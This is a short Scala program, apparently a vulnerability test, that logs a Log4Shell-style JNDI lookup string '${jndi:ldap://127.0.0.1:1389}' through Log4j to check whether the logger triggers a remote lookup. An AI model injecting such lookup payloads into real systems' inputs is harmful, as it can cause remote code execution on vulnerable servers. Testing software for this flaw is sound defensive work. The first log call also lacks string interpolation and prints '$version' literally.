import org.apache.logging.log4j.scala.Logging

object Main extends App with Logging {
  val version: String = System.getProperty("java.runtime.version")
  logger.info("Java version: $version")
  logger.info("JNDI call ${jndi:ldap://127.0.0.1:1389}")
}
